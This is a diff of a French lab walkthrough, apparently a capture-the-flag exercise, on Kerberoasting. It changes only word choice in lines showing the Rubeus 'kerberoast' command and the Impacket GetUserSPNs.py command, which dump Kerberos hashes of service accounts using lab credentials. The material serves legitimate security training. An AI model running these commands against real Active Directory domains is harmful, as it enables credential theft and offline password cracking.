@@ -38,7 +38,7 @@ il se trouve dans le dossier de téléchargements.
 
 1.) ```cd downloads``` - accédez au répertoire dans lequel se trouve Rubeus
 
-2.) ```Rubeus.exe kerberoast``` -  Cela videra le hachage Kerberos de tous les utilisateurs kerberoastable
+2.) ```Rubeus.exe kerberoast``` -  Cela dumpera le hachage Kerberos de tous les utilisateurs kerberoastable
 
 <img src="https://imgur.com/XZegVqf.png"/>
 
@@ -75,7 +75,7 @@ Les versions d'Impacket sont instables depuis la 0.9.20. Je suggère d'avoir une
 
 1.) ```cd /usr/share/doc/python3-impacket/examples/ - accédez à l'emplacement de GetUserSPNs.py```
 
-2.) ```sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request``` - cela videra le hachage Kerberos pour tous les comptes kerberoastable qu'il peut trouver sur le domaine cible, comme le fait Rubeus.
+2.) ```sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request``` - cela dumpera le hachage Kerberos pour tous les comptes kerberoastable qu'il peut trouver sur le domaine cible, comme le fait Rubeus.
 
 Cependant, cela ne doit pas nécessairement être sur la machine cible et peut être effectué à distance.
 
